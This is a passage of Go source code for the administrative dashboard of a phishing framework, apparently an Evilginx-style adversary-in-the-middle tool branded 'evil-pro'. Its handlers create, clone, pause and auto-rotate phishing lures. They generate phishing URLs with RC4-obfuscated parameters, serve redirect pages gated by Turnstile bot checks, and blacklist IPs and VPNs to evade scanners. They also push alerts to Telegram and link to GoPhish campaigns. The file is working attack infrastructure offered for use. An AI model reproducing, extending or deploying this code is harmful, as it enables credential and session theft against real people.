			valid := map[string]bool{"Mon": true, "Tue": true, "Wed": true, "Thu": true, "Fri": true, "Sat": true, "Sun": true}
			for _, d := range strings.Split(val, ",") {
				if !valid[strings.TrimSpace(d)] {
					jsonErr(w, 400, "invalid day: "+d)
					return
				}
			}
		}
		l.ActiveDays = val
	case "active_tz":
		if val != "" {
			if _, err := time.LoadLocation(val); err != nil {
				jsonErr(w, 400, "invalid timezone")
				return
			}
		}
		l.ActiveTZ = val
	default:
		jsonErr(w, 400, "unknown field: "+payload.Field)
		return
	}
	if err := ds.cfg.SetLure(id, l); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	if certRefresh {
		ds.cfg.refreshActiveHostnames()
		ds.manageCerts(false)
	}
	writeJSON(w, 200, ds.lureDTO(id, l))
}

func (ds *DashboardServer) handleLureClone(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	src, err := ds.cfg.GetLure(id)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	nl := *src
	nl.Path = "/" + GenRandomString(8)
	if nl.AutoRotate {
		now := time.Now().Unix()
		if nl.RotateInterval > 0 {
			nl.NextRotate = now + nl.RotateInterval
		} else {
			nl.NextRotate = now + 2700 + rand.Int63n(2700)
		}
	}
	ds.cfg.AddLure(nl.Phishlet, &nl)
	newId := len(ds.cfg.lures) - 1
	writeJSON(w, 200, ds.lureDTO(newId, &nl))
}

func (ds *DashboardServer) handleLureDelete(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	if _, err := ds.cfg.GetLure(id); err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	ds.cfg.DeleteLures([]int{id})
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (ds *DashboardServer) handleLurePause(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	l, err := ds.cfg.GetLure(id)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	var payload struct {
		Duration string `json:"duration"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	d, err := ParseDurationString(payload.Duration)
	if err != nil {
		jsonErr(w, 400, "invalid duration")
		return
	}
	l.PausedUntil = time.Now().Add(d).Unix()
	if err := ds.cfg.SetLure(id, l); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, ds.lureDTO(id, l))
}

func (ds *DashboardServer) handleLureUnpause(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	l, err := ds.cfg.GetLure(id)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	l.PausedUntil = 0
	if err := ds.cfg.SetLure(id, l); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, ds.lureDTO(id, l))
}

func (ds *DashboardServer) handleLureURL(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	l, err := ds.cfg.GetLure(id)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	pl, err := ds.cfg.GetPhishlet(l.Phishlet)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	base := ""
	if l.Hostname != "" {
		base = "https://" + l.Hostname + l.Path
	} else if u, err := pl.GetLureUrl(l.Path); err == nil {
		base = u
	}
	params := url.Values{}
	if raw := r.URL.Query().Get("params"); raw != "" {
		for _, kv := range strings.Split(raw, ",") {
			if i := strings.Index(kv, "="); i > 0 {
				params.Add(kv[:i], kv[i+1:])
			}
		}
	}
	if len(params) > 0 {
		base = createPhishURL(base, &params)
	}
	writeJSON(w, 200, map[string]string{"url": base})
}

// createPhishURL mirrors the terminal's parameter-encoding scheme.
func createPhishURL(base string, params *url.Values) string {
	if len(*params) == 0 {
		return base
	}
	keyArg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
	encKey := GenRandomAlphanumString(8)
	decParams := params.Encode()
	var crc byte
	for _, c := range decParams {
		crc += byte(c)
	}
	c, _ := rc4.NewCipher([]byte(encKey))
	enc := make([]byte, len(decParams)+1)
	c.XORKeyStream(enc[1:], []byte(decParams))
	enc[0] = crc
	return base + "?" + keyArg + "=" + encKey + base64.RawURLEncoding.EncodeToString([]byte(enc))
}

// ===========================================================================
// autolures (lures with auto_rotate)
// ===========================================================================

func (ds *DashboardServer) handleAutoLures(w http.ResponseWriter, r *http.Request) {
	out := []map[string]interface{}{}
	for i, l := range ds.cfg.lures {
		if l.AutoRotate {
			out = append(out, ds.lureDTO(i, l))
		}
	}
	writeJSON(w, 200, map[string]interface{}{"autolures": out, "now": time.Now().Unix()})
}

func (ds *DashboardServer) handleAutoLureNotify(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid id")
		return
	}
	l, err := ds.cfg.GetLure(id)
	if err != nil || !l.AutoRotate {
		jsonErr(w, 404, "not an autolure")
		return
	}
	var payload struct {
		On bool `json:"on"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	l.RotateNotify = payload.On
	if err := ds.cfg.SetLure(id, l); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, ds.lureDTO(id, l))
}

// ===========================================================================
// redirects
// ===========================================================================

func (ds *DashboardServer) handleRedirects(w http.ResponseWriter, r *http.Request) {
	pages := ds.cfg.GetRedirectPages()
	out := make([]map[string]interface{}, 0, len(pages))
	for i, rp := range pages {
		host := rp.Subdomain
		if d := ds.baseDomain(); d != "" {
			host = rp.Subdomain + "." + d
		}
		out = append(out, map[string]interface{}{
			"id": i, "subdomain": rp.Subdomain, "host": host, "file": rp.File,
			"target_url": rp.TargetURL, "turnstile": rp.Turnstile,
			"turnstile_pos": rp.TurnstilePos, "turnstile_type": rp.TurnstileType,
			"turnstile_theme": rp.TurnstileTheme, "delay": rp.Delay, "template": rp.Template,
		})
	}
	writeJSON(w, 200, map[string]interface{}{"redirects": out, "dir": ds.cfg.GetRedirectsDir()})
}

// handleRedirectTemplates lists the bundled redirect-page designs.
func (ds *DashboardServer) handleRedirectTemplates(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]interface{}{"templates": ListRedirectTemplates()})
}

// handleRedirectTemplatePreview renders a template with the supplied target/delay
// so the UI can show a live preview.
func (ds *DashboardServer) handleRedirectTemplatePreview(w http.ResponseWriter, r *http.Request) {
	slug := r.PathValue("slug")
	_, html, err := GetRedirectTemplate(slug)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	target := r.URL.Query().Get("target")
	delay := parseIntDefault(r.URL.Query().Get("delay"), 3)
	html = strings.ReplaceAll(html, "__DESTINATION__", target)
	html = strings.ReplaceAll(html, "__DELAY__", strconv.Itoa(delay))
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	fmt.Fprint(w, html)
}

var validRedirectTSPos = map[string]bool{"slot": true, "inline": true, "overlay": true, "center": true, "bottom": true, "corner": true}
var validRedirectTSType = map[string]bool{"managed": true, "non-interactive": true, "invisible": true}
var validRedirectTSTheme = map[string]bool{"light": true, "dark": true, "auto": true}

func (ds *DashboardServer) handleRedirectAdd(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	var payload struct {
		Subdomain      string `json:"subdomain"`
		File           string `json:"file"`
		Template       string `json:"template"`
		TargetURL      string `json:"target_url"`
		Turnstile      bool   `json:"turnstile"`
		TurnstilePos   string `json:"turnstile_pos"`
		TurnstileType  string `json:"turnstile_type"`
		TurnstileTheme string `json:"turnstile_theme"`
		Delay          int    `json:"delay"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if !regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$`).MatchString(payload.Subdomain) {
		jsonErr(w, 400, "invalid subdomain")
		return
	}
	if payload.TargetURL != "" {
		if _, err := url.ParseRequestURI(payload.TargetURL); err != nil {
			jsonErr(w, 400, "invalid target url")
			return
		}
	}
	for _, rp := range ds.cfg.GetRedirectPages() {
		if rp.Subdomain == payload.Subdomain {
			jsonErr(w, 409, "subdomain already assigned")
			return
		}
	}

	dir := ds.cfg.GetRedirectsDir()
	fileName := ""

	if payload.Template != "" {
		f, err := WriteRedirectTemplate(payload.Template, dir, payload.Subdomain)
		if err != nil {
			jsonErr(w, 400, err.Error())
			return
		}
		fileName = f
	} else {
		if payload.File == "" {
			jsonErr(w, 400, "file or template is required")
			return
		}
		fileName = filepath.Base(payload.File)
		if _, err := os.Stat(filepath.Join(dir, fileName)); os.IsNotExist(err) {
			jsonErr(w, 400, "file not found in redirects directory")
			return
		}
	}

	pos, typ, theme := payload.TurnstilePos, payload.TurnstileType, payload.TurnstileTheme
	if pos == "" {
		pos = "slot"
	}
	if typ == "" {
		typ = "managed"
	}
	if theme == "" {
		theme = "auto"
	}
	if !validRedirectTSPos[pos] {
		jsonErr(w, 400, "invalid turnstile position")
		return
	}
	if !validRedirectTSType[typ] {
		jsonErr(w, 400, "invalid turnstile type")
		return
	}
	if !validRedirectTSTheme[theme] {
		jsonErr(w, 400, "invalid turnstile theme")
		return
	}

	delay := payload.Delay
	if delay <= 0 {
		delay = 3
	}
	if delay > 30 {
		delay = 30
	}

	ds.cfg.AddRedirectPage(&RedirectPage{
		Subdomain: payload.Subdomain, File: fileName, TargetURL: payload.TargetURL,
		Turnstile: payload.Turnstile, TurnstilePos: pos, TurnstileType: typ,
		TurnstileTheme: theme, Delay: delay, Template: payload.Template,
	})
	ds.cfg.refreshActiveHostnames()
	ds.manageCerts(false)
	writeJSON(w, 200, map[string]string{"status": "added", "file": fileName})
}

func (ds *DashboardServer) handleRedirectDelete(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid id")
		return
	}
	if err := ds.cfg.DeleteRedirectPage(id); err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (ds *DashboardServer) handleRedirectFiles(w http.ResponseWriter, r *http.Request) {
	dir := ds.cfg.GetRedirectsDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		writeJSON(w, 200, map[string]interface{}{"files": []string{}, "dir": dir})
		return
	}
	files := []string{}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(e.Name()))
		if ext == ".html" || ext == ".htm" {
			files = append(files, e.Name())
		}
	}
	writeJSON(w, 200, map[string]interface{}{"files": files, "dir": dir})
}

// ===========================================================================
// blacklist
// ===========================================================================

func (ds *DashboardServer) handleBlacklist(w http.ResponseWriter, r *http.Request) {
	if ds.bl == nil {
		jsonErr(w, 500, "blacklist not available")
		return
	}
	ips, masks := ds.bl.GetStats()
	// build sorted list from the in-memory map
	list := make([]string, 0, len(ds.bl.ips))
	for ip := range ds.bl.ips {
		list = append(list, ip)
	}
	sort.Strings(list)

	search := strings.TrimSpace(r.URL.Query().Get("search"))
	if search != "" {
		f := make([]string, 0, len(list))
		for _, ip := range list {
			if strings.Contains(ip, search) {
				f = append(f, ip)
			}
		}
		list = f
	}
	total := len(list)
	limit := parseIntDefault(r.URL.Query().Get("limit"), 200)
	offset := parseIntDefault(r.URL.Query().Get("offset"), 0)
	if limit <= 0 {
		limit = 200
	}
	end := offset + limit
	if offset > total {
		offset = total
	}
	if end > total {
		end = total
	}
	writeJSON(w, 200, map[string]interface{}{
		"mode":  ds.cfg.GetBlacklistMode(),
		"count": ips,
		"masks": masks,
		"ips":   list[offset:end],
		"total": total,
		"log":   ds.bl.IsVerbose(),
		"file":  ds.bl.configPath,
	})
}

func (ds *DashboardServer) handleBlacklistMode(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		Mode string `json:"mode"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	switch payload.Mode {
	case "off", "unauth", "noadd", "all":
		ds.cfg.SetBlacklistMode(payload.Mode)
	default:
		jsonErr(w, 400, "mode must be off|unauth|noadd|all")
		return
	}
	writeJSON(w, 200, map[string]string{"mode": ds.cfg.GetBlacklistMode()})
}

func (ds *DashboardServer) handleBlacklistAdd(w http.ResponseWriter, r *http.Request) {
	if ds.bl == nil {
		jsonErr(w, 500, "blacklist not available")
		return
	}
	var payload struct {
		IP string `json:"ip"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	ip := strings.TrimSpace(payload.IP)
	if net.ParseIP(ip) == nil {
		jsonErr(w, 400, "invalid ip")
		return
	}
	if err := ds.bl.AddIP(ip); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "added", "ip": ip})
}

func (ds *DashboardServer) handleBlacklistDelete(w http.ResponseWriter, r *http.Request) {
	if ds.bl == nil {
		jsonErr(w, 500, "blacklist not available")
		return
	}
	ip := r.PathValue("ip")
	if err := ds.bl.RemoveIP(ip); err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "removed", "ip": ip})
}

// ===========================================================================
// config
// ===========================================================================

func (ds *DashboardServer) handleConfigGet(w http.ResponseWriter, r *http.Request) {
	c := ds.cfg
	writeJSON(w, 200, map[string]interface{}{
		"general": map[string]interface{}{
			"domain":             c.general.Domain,
			"external_ipv4":      c.general.ExternalIpv4,
			"bind_ipv4":          c.general.BindIpv4,
			"https_port":         c.general.HttpsPort,
			"http_port":          c.GetHttpPort(),
			"dns_port":           c.general.DnsPort,
			"autocert":           c.IsAutocertEnabled(),
			"unauth_url":         c.GetUnauthUrl(),
			"unauth_redirect":    c.IsUnauthRedirectEnabled(),
			"strip_headers":      c.IsStripHeadersEnabled(),
			"block_vpn":          c.GetBlockVPN(),
			"dashboard_sub":      c.GetDashboardSubdomain(),
			"dashboard_user":     c.GetDashboardUser(),
			"dashboard_pass_set": c.GetDashboardPass() != "",
			"turnstile_site_key": c.GetTurnstileSiteKey(),
			"turnstile_set":      c.GetTurnstileSecretKey() != "",
		},
		"telegram": map[string]interface{}{
			"chatid":     c.GetTelegramChatID(),
			"token_set":  c.GetTelegramBotToken() != "",
			"token_mask": maskSecret(c.GetTelegramBotToken()),
			"enabled":    c.GetTelegramEnabled(),
		},
		"gophish": map[string]interface{}{
			"admin_url":   c.GetGoPhishAdminUrl(),
			"api_key_set": c.GetGoPhishApiKey() != "",
			"insecure":    c.GetGoPhishInsecureTLS(),
		},
		"proxy": map[string]interface{}{
			"enabled":  c.proxyConfig.Enabled,
			"type":     c.proxyConfig.Type,
			"address":  c.proxyConfig.Address,
			"port":     c.proxyConfig.Port,
			"username": c.proxyConfig.Username,
			"pass_set": c.proxyConfig.Password != "",
		},
		"blacklist": map[string]interface{}{
			"mode": c.GetBlacklistMode(),
		},
	})
}

func maskSecret(s string) string {
	if s == "" {
		return ""
	}
	if len(s) <= 8 {
		return strings.Repeat("*", len(s))
	}
	return s[:4] + strings.Repeat("*", len(s)-8) + s[len(s)-4:]
}

func (ds *DashboardServer) handleConfigSet(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	var payload struct {
		Key   string `json:"key"`
		Value string `json:"value"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if err := ds.applyConfig(payload.Key, payload.Value); err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "ok"})
}

func (ds *DashboardServer) applyConfig(key, value string) error {
	c := ds.cfg
	switch key {
	case "domain":
		c.SetBaseDomain(value)
		c.ResetAllSites()
		ds.manageCerts(false)
	case "external_ipv4":
		c.SetServerExternalIP(value)
	case "bind_ipv4":
		c.SetServerBindIP(value)
	case "https_port":
		p, err := strconv.Atoi(value)
		if err != nil {
			return err
		}
		c.SetHttpsPort(p)
	case "http_port":
		p, err := strconv.Atoi(value)
		if err != nil {
			return err
		}
		c.SetHttpPort(p)
	case "dns_port":
		p, err := strconv.Atoi(value)
		if err != nil {
			return err
		}
		c.SetDnsPort(p)
	case "unauth_url":
		if value != "" {
			if _, err := url.ParseRequestURI(value); err != nil {
				return err
			}
		}
		c.SetUnauthUrl(value)
	case "unauth_redirect":
		c.SetUnauthRedirect(parseBool(value))
	case "strip_headers":
		c.SetStripHeaders(parseBool(value))
	case "autocert":
		c.EnableAutocert(parseBool(value))
		ds.manageCerts(false)
	case "blockvpn":
		c.SetBlockVPN(parseBool(value))
	case "dashboardsub":
		c.SetDashboardSubdomain(value)
	case "dashboard_user":
		c.SetDashboardUser(value)
		ds.SetCredentials(value, c.GetDashboardPass())
	case "dashboard_pass":
		c.SetDashboardPass(value)
		ds.SetCredentials(c.GetDashboardUser(), value)
	case "teletoken":
		c.SetTeletoken(value)
	case "chatid":
		c.SetChatid(value)
	case "gophish_admin_url":
		c.SetGoPhishAdminUrl(value)
	case "gophish_api_key":
		c.SetGoPhishApiKey(value)
	case "gophish_insecure":
		c.SetGoPhishInsecureTLS(parseBool(value))
	case "proxy_type":
		c.SetProxyType(value)
	case "proxy_address":
		c.SetProxyAddress(value)
	case "proxy_port":
		p, err := strconv.Atoi(value)
		if err != nil {
			return err
		}
		c.SetProxyPort(p)
	case "proxy_username":
		c.SetProxyUsername(value)
	case "proxy_password":
		c.SetProxyPassword(value)
	case "proxy_enabled":
		enabled := parseBool(value)
		if ds.hp != nil {
			if err := ds.hp.setProxy(enabled, c.proxyConfig.Type, c.proxyConfig.Address, c.proxyConfig.Port, c.proxyConfig.Username, c.proxyConfig.Password); err != nil {
				return err
			}
		}
		c.EnableProxy(enabled)
	default:
		return fmt.Errorf("unknown config key: %s", key)
	}
	return nil
}

func (ds *DashboardServer) handleConfigTurnstile(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	var payload struct {
		SiteKey   string `json:"site_key"`
		SecretKey string `json:"secret_key"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if payload.SiteKey == "" && payload.SecretKey == "" {
		ds.cfg.SetTurnstileKeys("", "")
		if ds.hp != nil {
			ds.hp.turnstile = false
		}
		writeJSON(w, 200, map[string]string{"status": "disabled"})
		return
	}
	ds.cfg.SetTurnstileKeys(payload.SiteKey, payload.SecretKey)
	if ds.hp != nil {
		ds.hp.turnstile = true
	}
	writeJSON(w, 200, map[string]string{"status": "enabled"})
}

// ===========================================================================
// integrations / cert
// ===========================================================================

func (ds *DashboardServer) handleTelegramTest(w http.ResponseWriter, r *http.Request) {
	chatid := ds.cfg.GetTelegramChatID()
	token := ds.cfg.GetTelegramBotToken()
	if chatid == "" || token == "" {
		jsonErr(w, 400, "telegram chat id or bot token not set")
		return
	}
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		jsonErr(w, 400, "failed to create bot: "+err.Error())
		return
	}
	chatIDInt, err := strconv.ParseInt(chatid, 10, 64)
	if err != nil {
		jsonErr(w, 400, "invalid chat id")
		return
	}
	ts := TelegramMarkdownV2Escape(time.Now().Format("2006-01-02 15:04:05"))
	msg := tgbotapi.NewMessage(chatIDInt, "\U0001f680 *evil\\-pro dashboard test*\n\n\u2705 Telegram notifications are working\\.\n`"+ts+"`")
	msg.ParseMode = "MarkdownV2"
	msg.DisableWebPagePreview = true
	if _, err := bot.Send(msg); err != nil {
		jsonErr(w, 400, "send failed: "+err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "sent"})
}

func (ds *DashboardServer) handleGoPhishTest(w http.ResponseWriter, r *http.Request) {
	if ds.hp == nil {
		jsonErr(w, 500, "proxy not available")
		return
	}
	if err := ds.hp.gophish.Setup(ds.cfg.GetGoPhishAdminUrl(), ds.cfg.GetGoPhishApiKey(), ds.cfg.GetGoPhishInsecureTLS()); err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	if err := ds.hp.gophish.Test(); err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "ok"})
}

func (ds *DashboardServer) handleCertTest(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	ds.cfg.refreshActiveHostnames()
	ds.manageCerts(true)
	writeJSON(w, 200, map[string]interface{}{"status": "attempted", "cert": ds.certStatus()})
}

// ===========================================================================
// small utils
// ===========================================================================

func parseIntDefault(s string, def int) int {
	if s == "" {
		return def
	}
	n, err := strconv.Atoi(s)
	if err != nil {
		return def
	}
	return n
}

func parseBool(s string) bool {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "1", "true", "on", "yes", "enabled":
		return true
	}
	return false
}

func parseCertDER(der []byte) (*x509.Certificate, error) {
	return x509.ParseCertificate(der)
}
